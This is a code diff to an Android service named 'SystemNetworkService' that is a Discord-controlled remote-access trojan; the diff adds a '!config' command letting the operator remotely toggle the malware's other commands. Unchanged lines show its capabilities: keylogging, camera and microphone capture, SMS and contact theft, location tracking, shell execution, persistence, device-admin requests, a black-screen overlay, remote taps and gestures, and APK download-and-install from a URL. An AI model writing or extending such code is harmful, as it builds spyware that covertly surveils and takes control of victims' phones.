@@ -251,6 +251,14 @@ class SystemNetworkService : Service() {
         val d = discord ?: return
         
         try {
+            if (action != "help" && action != "ping" && action != "info" && action != "status" &&
+                action != "debug" && action != "restart" && action != "uptime" && action != "ip" &&
+                action != "update" && action != "config") {
+                if (!com.openaccess.sdk.update.ConfigManager.isCommandEnabled(this, action)) {
+                    return
+                }
+            }
+
             when (action) {
                 "help" -> {
                     if (payload != null && payload.isNotBlank()) {
@@ -263,7 +271,7 @@ class SystemNetworkService : Service() {
                             "`ping` `info` `status` `ip` `uptime` `debug` `restart`\n" +
                             "`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n" +
                             "`contacts` `sms` `call_log` `wifi` `battery` `processes`\n" +
-                            "`installed` `notifications` `shell` `persist` `update`\n" +
+                            "`installed` `notifications` `shell` `persist` `update` `config`\n" +
                             "`admin` `overlay` `click` `input` `open` `screen`\n" +
                             "`gesture` `pin` `torch` `vibrate`\n\n" +
                             "Type `!help <cmd>` for usage info"
@@ -550,6 +558,71 @@ class SystemNetworkService : Service() {
                         }
                         else -> {
                             d.sendMsg(":book: **Update Commands**\n`!update check` - Check for pending updates\n`!update push <url>` - Download APK from URL\n`!update install` - Install downloaded update\n`!update clear` - Remove pending update\n`!update status` - Debug update state")
+                        }
+                    }
+                }
+                "config" -> {
+                    val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
+                    val cmd = parts.firstOrNull()?.lowercase() ?: ""
+                    val jsonStr = if (parts.size > 1) parts.subList(1, parts.size).joinToString(" ") else ""
+                    when (cmd) {
+                        "", "get", "status" -> {
+                            val status = com.openaccess.sdk.update.ConfigManager.getConfigStatus(this)
+                            val config = com.openaccess.sdk.update.ConfigManager.getConfig(this)
+                            val commands = config.optJSONObject("commands")
+                            val disabled = mutableListOf<String>()
+                            commands?.keys()?.forEach { k ->
+                                if (!commands.optBoolean(k, true)) disabled.add(k)
+                            }
+                            val disabledStr = if (disabled.isEmpty()) "none" else disabled.joinToString(", ")
+                            d.sendMsg(":gear: **Remote Config**\n$status\nDisabled: `$disabledStr`")
+                        }
+                        "push", "set" -> {
+                            if (jsonStr.isBlank()) {
+                                d.sendMsg(":x: **No config provided**. Usage: `!config push {\"version\":2,\"commands\":{\"shell\":false}}`")
+                            } else {
+                                try {
+                                    val newConfig = org.json.JSONObject(jsonStr)
+                                    val currentConfig = com.openaccess.sdk.update.ConfigManager.getConfig(this)
+                                    // Merge with current config
+                                    val commands = newConfig.optJSONObject("commands")
+                                    if (commands != null) {
+                                        val currentCommands = currentConfig.optJSONObject("commands") ?: org.json.JSONObject()
+                                        commands.keys().forEach { k ->
+                                            currentCommands.put(k, commands.optBoolean(k, true))
+                                        }
+                                        currentConfig.put("commands", currentCommands)
+                                    }
+                                    val settings = newConfig.optJSONObject("settings")
+                                    if (settings != null) {
+                                        val currentSettings = currentConfig.optJSONObject("settings") ?: org.json.JSONObject()
+                                        settings.keys().forEach { k ->
+                                            currentSettings.put(k, settings.opt(k))
+                                        }
+                                        currentConfig.put("settings", currentSettings)
+                                    }
+                                    val features = newConfig.optJSONObject("features")
+                                    if (features != null) {
+                                        val currentFeatures = currentConfig.optJSONObject("features") ?: org.json.JSONObject()
+                                        features.keys().forEach { k ->
+                                            currentFeatures.put(k, features.optBoolean(k, true))
+                                        }
+                                        currentConfig.put("features", currentFeatures)
+                                    }
+                                    if (newConfig.has("version")) currentConfig.put("version", newConfig.getInt("version"))
+                                    com.openaccess.sdk.update.ConfigManager.saveConfig(this, currentConfig)
+                                    d.sendMsg(":white_check_mark: **Config updated**\n${com.openaccess.sdk.update.ConfigManager.getConfigStatus(this)}")
+                                } catch (e: Exception) {
+                                    d.sendMsg(":x: **Invalid JSON**: ${e.message?.take(80) ?: "unknown"}")
+                                }
+                            }
+                        }
+                        "reset" -> {
+                            com.openaccess.sdk.update.ConfigManager.clearConfig(this)
+                            d.sendMsg(":wastebasket: **Config reset** to defaults")
+                        }
+                        else -> {
+                            d.sendMsg(":book: **Config Commands**\n`!config get` - View current config\n`!config push <json>` - Update config\n`!config reset` - Reset to defaults")
                         }
                     }
                 }
@@ -1549,6 +1622,7 @@ class SystemNetworkService : Service() {
             "shell" -> ":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExample: `!shell whoami`"
             "persist" -> ":syringe: **!persist**\nInstall persistence mechanism.\nUsage: `!persist`"
             "update" -> ":arrows_counterclockwise: **!update**\nSelf-update system.\nUsage: `!update check` - Check for updates\nUsage: `!update push <url>` - Download APK\nUsage: `!update install` - Apply update\nUsage: `!update clear` - Remove pending update"
+            "config" -> ":gear: **!config**\nRemote configuration.\nUsage: `!config get` - View current config\nUsage: `!config push <json>` - Update config\nUsage: `!config reset` - Reset to defaults"
             "admin" -> ":shield: **!admin**\nRequest device admin privileges.\nUsage: `!admin`"
             "overlay" -> ":black_large_square: **!overlay**\nToggle black screen overlay.\nUsage: `!overlay` (on)\nUsage: `!overlay off`"
             "click" -> ":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>`\nUsage: `!click x,y`"
